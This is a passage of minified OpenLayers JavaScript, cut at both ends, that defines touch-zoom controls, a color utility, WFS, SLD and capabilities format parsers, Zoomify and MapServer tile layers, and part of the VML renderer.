c=b.scale,d=this.map.layerContainerOriginPx,e=this.pinchOrigin,f=this.preserveCenter?this.map.getPixelFromLonLat(this.map.getCenter()):a.xy,g=Math.round(d.x+f.x-e.x+(c-1)*(d.x-e.x)),d=Math.round(d.y+f.y-e.y+(c-1)*(d.y-e.y));this.map.applyTransform(g,d,c);this.currentCenter=f},pinchDone:function(a,b,c){this.map.applyTransform();a=this.map.getZoomForResolution(this.map.getResolution()/c.scale,!0);if(a!==this.map.getZoom()||!this.currentCenter.equals(this.pinchOrigin)){b=\nthis.map.getResolutionForZoom(a);c=this.map.getLonLatFromPixel(this.pinchOrigin);var d=this.currentCenter,e=this.map.getSize();c.lon+=b*(e.w/2-d.x);c.lat-=b*(e.h/2-d.y);this.map.div.clientWidth=this.map.div.clientWidth;this.map.setCenter(c,a)}},CLASS_NAME:\"OpenLayers.Control.PinchZoom\"});OpenLayers.Control.TouchNavigation=OpenLayers.Class(OpenLayers.Control,{dragPan:null,dragPanOptions:null,pinchZoom:null,pinchZoomOptions:null,clickHandlerOptions:null,documentDrag:!1,autoActivate:!0,initialize:function(a){this.handlers={};OpenLayers.Control.prototype.initialize.apply(this,arguments)},destroy:function(){this.deactivate();this.dragPan&&this.dragPan.destroy();this.dragPan=null;this.pinchZoom&&(this.pinchZoom.destroy(),delete this.pinchZoom);OpenLayers.Control.prototype.destroy.apply(this,\narguments)},activate:function(){return OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.dragPan.activate(),this.handlers.click.activate(),this.pinchZoom.activate(),!0):!1},deactivate:function(){return OpenLayers.Control.prototype.deactivate.apply(this,arguments)?(this.dragPan.deactivate(),this.handlers.click.deactivate(),this.pinchZoom.deactivate(),!0):!1},draw:function(){var a={click:this.defaultClick,dblclick:this.defaultDblClick},b=OpenLayers.Util.extend({\"double\":!0,stopDouble:!0,\npixelTolerance:2},this.clickHandlerOptions);this.handlers.click=new OpenLayers.Handler.Click(this,a,b);this.dragPan=new OpenLayers.Control.DragPan(OpenLayers.Util.extend({map:this.map,documentDrag:this.documentDrag},this.dragPanOptions));this.dragPan.draw();this.pinchZoom=new OpenLayers.Control.PinchZoom(OpenLayers.Util.extend({map:this.map},this.pinchZoomOptions))},defaultClick:function(a){a.lastTouches&&2==a.lastTouches.length&&this.map.zoomOut()},defaultDblClick:function(a){this.map.zoomTo(this.map.zoom+\n1,a.xy)},CLASS_NAME:\"OpenLayers.Control.TouchNavigation\"});OpenLayers.Console.warn(\"OpenLayers.Rico is deprecated\");OpenLayers.Rico=OpenLayers.Rico||{};\nOpenLayers.Rico.Color=OpenLayers.Class({initialize:function(a,b,c){this.rgb={r:a,g:b,b:c}},setRed:function(a){this.rgb.r=a},setGreen:function(a){this.rgb.g=a},setBlue:function(a){this.rgb.b=a},setHue:function(a){var b=this.asHSB();b.h=a;this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,b.b)},setSaturation:function(a){var b=this.asHSB();b.s=a;this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,b.b)},setBrightness:function(a){var b=this.asHSB();b.b=a;this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,b.b)},\ndarken:function(a){var b=this.asHSB();this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,Math.max(b.b-a,0))},brighten:function(a){var b=this.asHSB();this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,Math.min(b.b+a,1))},blend:function(a){this.rgb.r=Math.floor((this.rgb.r+a.rgb.r)/2);this.rgb.g=Math.floor((this.rgb.g+a.rgb.g)/2);this.rgb.b=Math.floor((this.rgb.b+a.rgb.b)/2)},isBright:function(){this.asHSB();return 0.5<this.asHSB().b},isDark:function(){return!this.isBright()},asRGB:function(){return\"rgb(\"+\nthis.rgb.r+\",\"+this.rgb.g+\",\"+this.rgb.b+\")\"},asHex:function(){return\"#\"+this.rgb.r.toColorPart()+this.rgb.g.toColorPart()+this.rgb.b.toColorPart()},asHSB:function(){return OpenLayers.Rico.Color.RGBtoHSB(this.rgb.r,this.rgb.g,this.rgb.b)},toString:function(){return this.asHex()}});\nOpenLayers.Rico.Color.createFromHex=function(a){if(4==a.length){var b=a;a=\"#\";for(var c=1;4>c;c++)a+=b.charAt(c)+b.charAt(c)}0==a.indexOf(\"#\")&&(a=a.substring(1));b=a.substring(0,2);c=a.substring(2,4);a=a.substring(4,6);return new OpenLayers.Rico.Color(parseInt(b,16),parseInt(c,16),parseInt(a,16))};\nOpenLayers.Rico.Color.createColorFromBackground=function(a){var b=OpenLayers.Element.getStyle(OpenLayers.Util.getElement(a),\"backgroundColor\");return\"transparent\"==b&&a.parentNode?OpenLayers.Rico.Color.createColorFromBackground(a.parentNode):null==b?new OpenLayers.Rico.Color(255,255,255):0==b.indexOf(\"rgb(\")?(a=b.substring(4,b.length-1).split(\",\"),new OpenLayers.Rico.Color(parseInt(a[0]),parseInt(a[1]),parseInt(a[2]))):0==b.indexOf(\"#\")?OpenLayers.Rico.Color.createFromHex(b):new OpenLayers.Rico.Color(255,\n255,255)};\nOpenLayers.Rico.Color.HSBtoRGB=function(a,b,c){var d=0,e=0,f=0;if(0==b)f=e=d=parseInt(255*c+0.5);else{a=6*(a-Math.floor(a));var g=a-Math.floor(a),h=c*(1-b),k=c*(1-b*g);b=c*(1-b*(1-g));switch(parseInt(a)){case 0:d=255*c+0.5;e=255*b+0.5;f=255*h+0.5;break;case 1:d=255*k+0.5;e=255*c+0.5;f=255*h+0.5;break;case 2:d=255*h+0.5;e=255*c+0.5;f=255*b+0.5;break;case 3:d=255*h+0.5;e=255*k+0.5;f=255*c+0.5;break;case 4:d=255*b+0.5;e=255*h+0.5;f=255*c+0.5;break;case 5:d=255*c+0.5,e=255*h+0.5,f=255*k+0.5}}return{r:parseInt(d),g:parseInt(e),\nb:parseInt(f)}};OpenLayers.Rico.Color.RGBtoHSB=function(a,b,c){var d,e=a>b?a:b;c>e&&(e=c);var f=a<b?a:b;c<f&&(f=c);d=0!=e?(e-f)/e:0;if(0==d)a=0;else{var g=(e-a)/(e-f),h=(e-b)/(e-f);c=(e-c)/(e-f);a=(a==e?c-h:b==e?2+g-c:4+h-g)/6;0>a&&(a+=1)}return{h:a,s:d,b:e/255}};OpenLayers.Style2=OpenLayers.Class({id:null,name:null,title:null,description:null,layerName:null,isDefault:!1,rules:null,initialize:function(a){OpenLayers.Util.extend(this,a);this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+\"_\")},destroy:function(){for(var a=0,b=this.rules.length;a<b;a++)this.rules[a].destroy();delete this.rules},clone:function(){var a=OpenLayers.Util.extend({},this);if(this.rules){a.rules=[];for(var b=0,c=this.rules.length;b<c;++b)a.rules.push(this.rules[b].clone())}return new OpenLayers.Style2(a)},\nCLASS_NAME:\"OpenLayers.Style2\"});OpenLayers.Format.WFS=OpenLayers.Class(OpenLayers.Format.GML,{layer:null,wfsns:\"http://www.opengis.net/wfs\",ogcns:\"http://www.opengis.net/ogc\",initialize:function(a,b){OpenLayers.Format.GML.prototype.initialize.apply(this,[a]);this.layer=b;this.layer.featureNS&&(this.featureNS=this.layer.featureNS);this.layer.options.geometry_column&&(this.geometryName=this.layer.options.geometry_column);this.layer.options.typename&&(this.featureName=this.layer.options.typename)},write:function(a){var b=this.createElementNS(this.wfsns,\n\"wfs:Transaction\");b.setAttribute(\"version\",\"1.0.0\");b.setAttribute(\"service\",\"WFS\");for(var c=0;c<a.length;c++)switch(a[c].state){case OpenLayers.State.INSERT:b.appendChild(this.insert(a[c]));break;case OpenLayers.State.UPDATE:b.appendChild(this.update(a[c]));break;case OpenLayers.State.DELETE:b.appendChild(this.remove(a[c]))}return OpenLayers.Format.XML.prototype.write.apply(this,[b])},createFeatureXML:function(a){var b=this.buildGeometryNode(a.geometry),c=this.createElementNS(this.featureNS,\"feature:\"+\nthis.geometryName);c.appendChild(b);b=this.createElementNS(this.featureNS,\"feature:\"+this.featureName);b.appendChild(c);for(var d in a.attributes){var c=this.createTextNode(a.attributes[d]),e=d;-1!=d.search(\":\")&&(e=d.split(\":\")[1]);e=this.createElementNS(this.featureNS,\"feature:\"+e);e.appendChild(c);b.appendChild(e)}return b},insert:function(a){var b=this.createElementNS(this.wfsns,\"wfs:Insert\");b.appendChild(this.createFeatureXML(a));return b},update:function(a){a.fid||OpenLayers.Console.userError(OpenLayers.i18n(\"noFID\"));\nvar b=this.createElementNS(this.wfsns,\"wfs:Update\");b.setAttribute(\"typeName\",this.featurePrefix+\":\"+this.featureName);b.setAttribute(\"xmlns:\"+this.featurePrefix,this.featureNS);var c=this.createElementNS(this.wfsns,\"wfs:Property\"),d=this.createElementNS(this.wfsns,\"wfs:Name\"),e=this.createTextNode(this.geometryName);d.appendChild(e);c.appendChild(d);d=this.createElementNS(this.wfsns,\"wfs:Value\");e=this.buildGeometryNode(a.geometry);a.layer&&e.setAttribute(\"srsName\",a.layer.projection.getCode());\nd.appendChild(e);c.appendChild(d);b.appendChild(c);for(var f in a.attributes)c=this.createElementNS(this.wfsns,\"wfs:Property\"),d=this.createElementNS(this.wfsns,\"wfs:Name\"),d.appendChild(this.createTextNode(f)),c.appendChild(d),d=this.createElementNS(this.wfsns,\"wfs:Value\"),d.appendChild(this.createTextNode(a.attributes[f])),c.appendChild(d),b.appendChild(c);c=this.createElementNS(this.ogcns,\"ogc:Filter\");f=this.createElementNS(this.ogcns,\"ogc:FeatureId\");f.setAttribute(\"fid\",a.fid);c.appendChild(f);\nb.appendChild(c);return b},remove:function(a){if(!a.fid)return OpenLayers.Console.userError(OpenLayers.i18n(\"noFID\")),!1;var b=this.createElementNS(this.wfsns,\"wfs:Delete\");b.setAttribute(\"typeName\",this.featurePrefix+\":\"+this.featureName);b.setAttribute(\"xmlns:\"+this.featurePrefix,this.featureNS);var c=this.createElementNS(this.ogcns,\"ogc:Filter\"),d=this.createElementNS(this.ogcns,\"ogc:FeatureId\");d.setAttribute(\"fid\",a.fid);c.appendChild(d);b.appendChild(c);return b},destroy:function(){this.layer=\nnull},CLASS_NAME:\"OpenLayers.Format.WFS\"});OpenLayers.Format.SLD.v1_0_0_GeoServer=OpenLayers.Class(OpenLayers.Format.SLD.v1_0_0,{version:\"1.0.0\",profile:\"GeoServer\",readers:OpenLayers.Util.applyDefaults({sld:OpenLayers.Util.applyDefaults({Priority:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&&(b.priority=c)},VendorOption:function(a,b){b.vendorOptions||(b.vendorOptions={});b.vendorOptions[a.getAttribute(\"name\")]=this.getChildValue(a)},TextSymbolizer:function(a,b){OpenLayers.Format.SLD.v1_0_0.prototype.readers.sld.TextSymbolizer.apply(this,\narguments);var c=this.multipleSymbolizers?b.symbolizers[b.symbolizers.length-1]:b.symbolizer.Text;void 0===c.graphic&&(c.graphic=!1)}},OpenLayers.Format.SLD.v1_0_0.prototype.readers.sld)},OpenLayers.Format.SLD.v1_0_0.prototype.readers),writers:OpenLayers.Util.applyDefaults({sld:OpenLayers.Util.applyDefaults({Priority:function(a){return this.writers.sld._OGCExpression.call(this,\"sld:Priority\",a)},VendorOption:function(a){return this.createElementNSPlus(\"sld:VendorOption\",{attributes:{name:a.name},\nvalue:a.value})},TextSymbolizer:function(a){var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.TextSymbolizer.apply(this,arguments);!1!==a.graphic&&(a.externalGraphic||a.graphicName)&&this.writeNode(\"Graphic\",a,b);\"priority\"in a&&this.writeNode(\"Priority\",a.priority,b);return this.addVendorOptions(b,a)},PointSymbolizer:function(a){var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.PointSymbolizer.apply(this,arguments);return this.addVendorOptions(b,a)},LineSymbolizer:function(a){var b=\nOpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.LineSymbolizer.apply(this,arguments);return this.addVendorOptions(b,a)},PolygonSymbolizer:function(a){var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.PolygonSymbolizer.apply(this,arguments);return this.addVendorOptions(b,a)}},OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld)},OpenLayers.Format.SLD.v1_0_0.prototype.writers),addVendorOptions:function(a,b){if(b.vendorOptions)for(var c in b.vendorOptions)this.writeNode(\"VendorOption\",{name:c,\nvalue:b.vendorOptions[c]},a);return a},CLASS_NAME:\"OpenLayers.Format.SLD.v1_0_0_GeoServer\"});OpenLayers.Layer.Boxes=OpenLayers.Class(OpenLayers.Layer.Markers,{drawMarker:function(a){var b=this.map.getLayerPxFromLonLat({lon:a.bounds.left,lat:a.bounds.top}),c=this.map.getLayerPxFromLonLat({lon:a.bounds.right,lat:a.bounds.bottom});null==c||null==b?a.display(!1):(b=a.draw(b,{w:Math.max(1,c.x-b.x),h:Math.max(1,c.y-b.y)}),a.drawn||(this.div.appendChild(b),a.drawn=!0))},removeMarker:function(a){OpenLayers.Util.removeItem(this.markers,a);null!=a.div&&a.div.parentNode==this.div&&this.div.removeChild(a.div)},\nCLASS_NAME:\"OpenLayers.Layer.Boxes\"});OpenLayers.Format.WFSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.WFSCapabilities.v1,{readers:{wfs:OpenLayers.Util.applyDefaults({Service:function(a,b){b.service={};this.readChildNodes(a,b.service)},Fees:function(a,b){var c=this.getChildValue(a);c&&\"none\"!=c.toLowerCase()&&(b.fees=c)},AccessConstraints:function(a,b){var c=this.getChildValue(a);c&&\"none\"!=c.toLowerCase()&&(b.accessConstraints=c)},OnlineResource:function(a,b){var c=this.getChildValue(a);c&&\"none\"!=c.toLowerCase()&&(b.onlineResource=\nc)},Keywords:function(a,b){var c=this.getChildValue(a);c&&\"none\"!=c.toLowerCase()&&(b.keywords=c.split(\", \"))},Capability:function(a,b){b.capability={};this.readChildNodes(a,b.capability)},Request:function(a,b){b.request={};this.readChildNodes(a,b.request)},GetFeature:function(a,b){b.getfeature={href:{},formats:[]};this.readChildNodes(a,b.getfeature)},ResultFormat:function(a,b){for(var c=a.childNodes,d,e=0;e<c.length;e++)d=c[e],1==d.nodeType&&b.formats.push(d.nodeName)},DCPType:function(a,b){this.readChildNodes(a,\nb)},HTTP:function(a,b){this.readChildNodes(a,b.href)},Get:function(a,b){b.get=a.getAttribute(\"onlineResource\")},Post:function(a,b){b.post=a.getAttribute(\"onlineResource\")},SRS:function(a,b){var c=this.getChildValue(a);c&&(b.srs=c)}},OpenLayers.Format.WFSCapabilities.v1.prototype.readers.wfs)},CLASS_NAME:\"OpenLayers.Format.WFSCapabilities.v1_0_0\"});OpenLayers.Format.WMSCapabilities.v1_3=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1,{readers:{wms:OpenLayers.Util.applyDefaults({WMS_Capabilities:function(a,b){this.readChildNodes(a,b)},LayerLimit:function(a,b){b.layerLimit=parseInt(this.getChildValue(a))},MaxWidth:function(a,b){b.maxWidth=parseInt(this.getChildValue(a))},MaxHeight:function(a,b){b.maxHeight=parseInt(this.getChildValue(a))},BoundingBox:function(a,b){var c=OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms.BoundingBox.apply(this,\n[a,b]);c.srs=a.getAttribute(\"CRS\");b.bbox[c.srs]=c},CRS:function(a,b){this.readers.wms.SRS.apply(this,[a,b])},EX_GeographicBoundingBox:function(a,b){b.llbbox=[];this.readChildNodes(a,b.llbbox)},westBoundLongitude:function(a,b){b[0]=this.getChildValue(a)},eastBoundLongitude:function(a,b){b[2]=this.getChildValue(a)},southBoundLatitude:function(a,b){b[1]=this.getChildValue(a)},northBoundLatitude:function(a,b){b[3]=this.getChildValue(a)},MinScaleDenominator:function(a,b){b.maxScale=parseFloat(this.getChildValue(a)).toPrecision(16)},\nMaxScaleDenominator:function(a,b){b.minScale=parseFloat(this.getChildValue(a)).toPrecision(16)},Dimension:function(a,b){var c={name:a.getAttribute(\"name\").toLowerCase(),units:a.getAttribute(\"units\"),unitsymbol:a.getAttribute(\"unitSymbol\"),nearestVal:\"1\"===a.getAttribute(\"nearestValue\"),multipleVal:\"1\"===a.getAttribute(\"multipleValues\"),\"default\":a.getAttribute(\"default\")||\"\",current:\"1\"===a.getAttribute(\"current\"),values:this.getChildValue(a).split(\",\")};b.dimensions[c.name]=c},Keyword:function(a,\nb){var c={value:this.getChildValue(a),vocabulary:a.getAttribute(\"vocabulary\")};b.keywords&&b.keywords.push(c)}},OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms),sld:{UserDefinedSymbolization:function(a,b){this.readers.wms.UserDefinedSymbolization.apply(this,[a,b]);b.userSymbols.inlineFeature=1==parseInt(a.getAttribute(\"InlineFeature\"));b.userSymbols.remoteWCS=1==parseInt(a.getAttribute(\"RemoteWCS\"))},DescribeLayer:function(a,b){this.readers.wms.DescribeLayer.apply(this,[a,b])},GetLegendGraphic:function(a,\nb){this.readers.wms.GetLegendGraphic.apply(this,[a,b])}}},CLASS_NAME:\"OpenLayers.Format.WMSCapabilities.v1_3\"});OpenLayers.Layer.Zoomify=OpenLayers.Class(OpenLayers.Layer.Grid,{size:null,isBaseLayer:!0,standardTileSize:256,tileOriginCorner:\"tl\",numberOfTiers:0,tileCountUpToTier:null,tierSizeInTiles:null,tierImageSize:null,initialize:function(a,b,c,d){this.initializeZoomify(c);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a,b,c,{},d])},initializeZoomify:function(a){var b=a.clone();this.size=a.clone();a=new OpenLayers.Size(Math.ceil(b.w/this.standardTileSize),Math.ceil(b.h/this.standardTileSize));this.tierSizeInTiles=\n[a];for(this.tierImageSize=[b];b.w>this.standardTileSize||b.h>this.standardTileSize;)b=new OpenLayers.Size(Math.floor(b.w/2),Math.floor(b.h/2)),a=new OpenLayers.Size(Math.ceil(b.w/this.standardTileSize),Math.ceil(b.h/this.standardTileSize)),this.tierSizeInTiles.push(a),this.tierImageSize.push(b);this.tierSizeInTiles.reverse();this.tierImageSize.reverse();this.numberOfTiers=this.tierSizeInTiles.length;b=[1];this.tileCountUpToTier=[0];for(a=1;a<this.numberOfTiers;a++)b.unshift(Math.pow(2,a)),this.tileCountUpToTier.push(this.tierSizeInTiles[a-\n1].w*this.tierSizeInTiles[a-1].h+this.tileCountUpToTier[a-1]);this.serverResolutions||(this.serverResolutions=b)},destroy:function(){OpenLayers.Layer.Grid.prototype.destroy.apply(this,arguments);this.tileCountUpToTier.length=0;this.tierSizeInTiles.length=0;this.tierImageSize.length=0},clone:function(a){null==a&&(a=new OpenLayers.Layer.Zoomify(this.name,this.url,this.size,this.options));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){a=this.adjustBounds(a);var b=\nthis.getServerResolution(),c=Math.round((a.left-this.tileOrigin.lon)/(b*this.tileSize.w));a=Math.round((this.tileOrigin.lat-a.top)/(b*this.tileSize.h));b=this.getZoomForResolution(b);c=\"TileGroup\"+Math.floor((c+a*this.tierSizeInTiles[b].w+this.tileCountUpToTier[b])/256)+\"/\"+b+\"-\"+c+\"-\"+a+\".jpg\";b=this.url;OpenLayers.Util.isArray(b)&&(b=this.selectUrl(c,b));return b+c},getImageSize:function(){if(0<arguments.length){var a=this.adjustBounds(arguments[0]),b=this.getServerResolution(),c=Math.round((a.left-\nthis.tileOrigin.lon)/(b*this.tileSize.w)),a=Math.round((this.tileOrigin.lat-a.top)/(b*this.tileSize.h)),b=this.getZoomForResolution(b),d=this.standardTileSize,e=this.standardTileSize;c==this.tierSizeInTiles[b].w-1&&(d=this.tierImageSize[b].w%this.standardTileSize);a==this.tierSizeInTiles[b].h-1&&(e=this.tierImageSize[b].h%this.standardTileSize);return new OpenLayers.Size(d,e)}return this.tileSize},setMap:function(a){OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments);this.tileOrigin=new OpenLayers.LonLat(this.map.maxExtent.left,\nthis.map.maxExtent.top)},CLASS_NAME:\"OpenLayers.Layer.Zoomify\"});OpenLayers.Layer.MapServer=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{mode:\"map\",map_imagetype:\"png\"},initialize:function(a,b,c,d){OpenLayers.Layer.Grid.prototype.initialize.apply(this,arguments);this.params=OpenLayers.Util.applyDefaults(this.params,this.DEFAULT_PARAMS);if(null==d||null==d.isBaseLayer)this.isBaseLayer=\"true\"!=this.params.transparent&&!0!=this.params.transparent},clone:function(a){null==a&&(a=new OpenLayers.Layer.MapServer(this.name,this.url,this.params,this.getOptions()));\nreturn a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){a=this.adjustBounds(a);a=[a.left,a.bottom,a.right,a.top];var b=this.getImageSize();return this.getFullRequestString({mapext:a,imgext:a,map_size:[b.w,b.h],imgx:b.w/2,imgy:b.h/2,imgxy:[b.w,b.h]})},getFullRequestString:function(a,b){var c=null==b?this.url:b,d=OpenLayers.Util.extend({},this.params),d=OpenLayers.Util.extend(d,a),e=OpenLayers.Util.getParameterString(d);OpenLayers.Util.isArray(c)&&(c=this.selectUrl(e,c));\nvar e=OpenLayers.Util.upperCaseObject(OpenLayers.Util.getParameters(c)),f;for(f in d)f.toUpperCase()in e&&delete d[f];e=OpenLayers.Util.getParameterString(d);d=c;e=e.replace(/,/g,\"+\");\"\"!=e&&(f=c.charAt(c.length-1),d=\"&\"==f||\"?\"==f?d+e:-1==c.indexOf(\"?\")?d+(\"?\"+e):d+(\"&\"+e));return d},CLASS_NAME:\"OpenLayers.Layer.MapServer\"});OpenLayers.Renderer.VML=OpenLayers.Class(OpenLayers.Renderer.Elements,{xmlns:\"urn:schemas-microsoft-com:vml\",symbolCache:{},offset:null,initialize:function(a){if(this.supported()){if(!document.namespaces.olv){document.namespaces.add(\"olv\",this.xmlns);for(var b=document.createStyleSheet(),c=\"shape rect oval fill stroke imagedata group textbox\".split(\" \"),d=0,e=c.length;d<e;d++)b.addRule(\"olv\\\\:\"+c[d],\"behavior: url(#default#VML); position: absolute; display: inline-block;\")}OpenLayers.Renderer.Elements.prototype.initialize.apply(this,\narguments)}},supported:function(){return!!document.namespaces},setExtent:function(a,b){var c=OpenLayers.Renderer.Elements.prototype.setExtent.apply(this,arguments),d=this.getResolution(),e=a.left/d|0,d=a.top/d-this.size.h|0;b||!this.offset?(this.offset={x:e,y:d},d=e=0):(e-=this.offset.x,d-=this.offset.y);this.root.coordorigin=e-this.xOffset+\" \"+d;for(var e=[this.root,this.vectorRoot,this.textRoot],f=0,g=e.length;f<g;++f)d=e[f],d.coordsize=this.size.w+\" \"+this.size.h;this.root.style.flip=\"y\";return c},\nsetSize:function(a){OpenLayers.Renderer.prototype.setSize.apply(this,arguments);for(var b=[this.rendererRoot,this.root,this.vectorRoot,this.textRoot],c=this.size.w+\"px\",d=this.size.h+\"px\",e,f=0,g=b.length;f<g;++f)e=b[f],e.style.width=c,e.style.height=d},getNodeType:function(a,b){var c=null;switch(a.CLASS_NAME){case \"OpenLayers.Geometry.Point\":c=b.externalGraphic?\"olv:rect\":this.isComplexSymbol(b.graphicName)?\"olv:shape\":\"olv:oval\";break;case \"OpenLayers.Geometry.Rectangle\":c=\"olv:rect\";break;case \"OpenLayers.Geometry.LineString\":case \"OpenLayers.Geometry.LinearRing\":case \"OpenLayers.Geometry.Polygon\":case \"OpenLayers.Geometry.Curve\":c=\n\"olv:shape\"}return c},setStyle:function(a,b,c,d){b=b||a._style;c=c||a._options;var e=b.fillColor,f=b.title||b.graphicTitle;f&&(a.title=f);if(\"OpenLayers.Geometry.Point\"===a._geometryClass)if(b.externalGraphic){c.isFilled=!0;var e=b.graphicWidth||b.graphicHeight,f=b.graphicHeight||b.graphicWidth,e=e?e:2*b.pointRadius,f=f?f:2*b.pointRadius,g=this.getResolution(),h=void 0!=b.graphicXOffset?b.graphicXOffset:-(0.5*e),k=void 0!=b.graphicYOffset?b.graphicYOffset:-(0.5*f);a.style.left=((d.x-this.featureDx)/\ng-this.offset.x+h|0)+\"px\";a.style.top=(d.y/g-this.offset.y-(k+f)|0)+\"px\";a.style.width=e+\"px\";a.style.height=f+\"px\";a.style.flip=\"y\";e=\"none\";c.isStroked=!1}else this.isComplexSymbol(b.graphicName)?(f=this.importSymbol(b.graphicName),a.path=f.path,a.coordorigin=f.left+\",\"+f.bottom,f=f.size,a.coordsize=f+\",\"+f,this.drawCircle(a,d,b.pointRadius),a.style.flip=\"y\"):this.drawCircle(a,d,b.pointRadius);c.isFilled?a.fillcolor=e:a.filled=\"false\";d=a.getElementsByTagName(\"fill\");d=0==d.length?null:d[0];c.isFilled?\n(d||(d=this.createNode(\"olv:fill\",a.id+\"_fill\")),d.opacity=b.fillOpacity,\"OpenLayers.Geometry.Point\"===a._geometryClass&&b.externalGraphic&&(b.graphicOpacity&&(d.opacity=b.graphicOpacity),d.src=b.externalGraphic,d.type=\"frame\",b.graphicWidth&&b.graphicHeight||(d.aspect=\"atmost\")),d.parentNode!=a&&a.appendChild(d)):d&&a.removeChild(d);e=b.rotation;if(void 0!==e||void 0!==a._rotation)a._rotation=e,b.externalGraphic?(this.graphicRotate(a,h,k,b),d.opacity=0):\"OpenLayers.Geometry.Point\"===a._geometryClass&&\n(a.style.rotation=e||0);h=a.getElementsByTagName(\"stroke\");h=0==h.length?null:h[0];c.isStroked?(h||(h=this.createNode(\"olv:stroke\",a.id+\"_stroke\"),a.appendChild(h)),h.on=!0,h.color=b.strokeColor,h.weight=b.strokeWidth+\"px\",h.opacity=b.strokeOpacity,h.endcap=\"butt\"==b.strokeLinecap?\"flat\":b.strokeLinecap||\"round\",b.strokeDashstyle&&(h.dashstyle=this.dashStyle(b))):(a.stroked=!1,h&&(h.on=!1));\"inherit\"!=b.cursor&&null!=b.cursor&&(a.style.cursor=b.cursor);return a},graphicRotate:function(a,b,c,d){d=\nd||a._style;var e=d.rotation||0,f,g;if(d.graphicWidth&&d.graphicHeight){g=Math.max(d.graphicWidth,d.graphicHeight);f=d.graphicWidth/d.graphicHeight;var h=Math.round(d.graphicWidth||g*f),k=Math.round(d.graphicHeight||g);a.style.width=h+\"px\";a.style.height=k+\"px\";var l=document.getElementById(a.id+\"_image\");l||(l=this.createNode(\"olv:imagedata\",a.id+\"_image\"),a.appendChild(l));l.style.width=h+\"px\";l.style.height=k+\"px\";l.src=d.externalGraphic;l.style.filter=\"progid:DXImageTransform.Microsoft.AlphaImageLoader(src='', sizingMethod='scale')\";\nl=e*Math.PI/180;e=Math.sin(l);l=Math.cos(l);e=\"progid:DXImageTransform.Microsoft.Matrix(M11=\"+l+\",M12=\"+-e+\",M21=\"+e+\",M22=\"+l+\",SizingMethod='auto expand')\\n\";(l=d.graphicOpacity||d.fillOpacity)&&1!=l&&(e+=\"progid:DXImageTransform.Microsoft.BasicImage(opacity=\"+l+\")\\n\");a.style.filter=e;e=new OpenLayers.Geometry.Point(-b,-c);h=(new OpenLayers.Bounds(0,0,h,k)).toGeometry();h.rotate(d.rotation,e);h=h.getBounds();a.style.left=Math.round(parseInt(a.style.left)+h.left)+\"px\";a.style.top=Math.round(parseInt(a.style.top)-\nh.bottom)+\"px\"}else{var m=new Image;m.onreadystatechange=OpenLayers.Function.bind(function(){if(\"complete\"==m.readyState||\"interactive\"==m.readyState)f=m.width/m.height,g=Math.max(2*d.pointRadius,d.graphicWidth||0,d.graphicHeight||0),b*=f,d.graphicWidth=g*f,d.graphicHeight=g,this.graphicRotate(a,b,c,d)},this);m.src=d.externalGraphic}},postDraw:function(a){a.style.visibility=\"visible\";var b=a._style.fillColor,c=a._style.strokeColor;\"none\"==b&&a.fillcolor!=b&&(a.fillcolor=b);\"none\"==c&&a.strokecolor!=\nc&&(a.strokecolor=c)},setNodeDimension:function(a,b){var c=b.getBounds();if(c){var d=this.getResolution(),c=new OpenLayers.Bounds((c.left-this.featureDx)/d-this.offset.x|0,c.bottom/d-this.offset.y|0,(c.right-this.featureDx)/d-this.offset.x|0,c.top/d-this.offset.y|0);a.style.left=c.left+\"px\";a.style.top=c.top+\"px\";a.style.width=c.getWidth()+\"px\";a.style.height=c.getHeight()+\"px\";a.coordorigin=c.left+\" \"+c.top;a.coordsize=c.getWidth()+\" \"+c.getHeight()}},dashStyle:function(a){a=a.strokeDashstyle;switch(a){case \"solid\":case \"dot\":case \"dash\":case \"dashdot\":case \"longdash\":case \"longdashdot\":return a;\ndefault:return a=a.split(/[ ,]/),2==a.length?1*a[0]>=2*a[1]?\"longdash\":1==a[0]||1==a[1]?\"dot\":\"dash\":4==a.length?1*a[0]>=2*a[1]?\"longdashdot\":\"dashdot\":\"solid\"}},createNode:function(a,b){var c=document.createElement(a);b&&(c.id=b);c.unselectable=\"on\";c.onselectstart=OpenLayers.Function.False;return c},nodeTypeCompare:function(a,b){var c=b,d=c.indexOf(\":\");-1!=d&&(c=c.substr(d+1));var e=a.nodeName,d=e.indexOf(\":\");-1!=d&&(e=e.substr(d+1));return c==e},createRenderRoot:function(){return this.nodeFactory(this.container.id+\n\"_vmlRoot\",\"div\")},createRoot:function(a){return this.nodeFactory(this.container.id+a,\"olv:group\")},drawPoint:function(a,b){return this.drawCircle(a,b,1)},drawCircle:function(a,b,c){if(!isNaN(b.x)&&!isNaN(b.y)){var d=this.getResolution();a.style.left=((b.x-this.featureDx)/d-this.offset.x|0)-c+\"px\";a.style.top=(b.y/d-this.offset.y|0)-c+\"px\";b=2*c;a.style.width=b+\"px\";a.style.height=b+\"px\";return a}return!1},drawLineString:function(a,b){return this.drawLine(a,b,!1)},drawLinearRing:function(a,b){return this.drawLine(a,\nb,!0)},drawLine:function(a,b,c){this.setNodeDimension(a,b);for(var d=this.getResolution(),e=b.components.length,f=Array(e),g,h,k=0;k<e;k++)g=b.components[k],h=(g.x-this.featureDx)/d-this.offset.x|0,g=g.y/d-this.offset.y|0,f[k]=\" 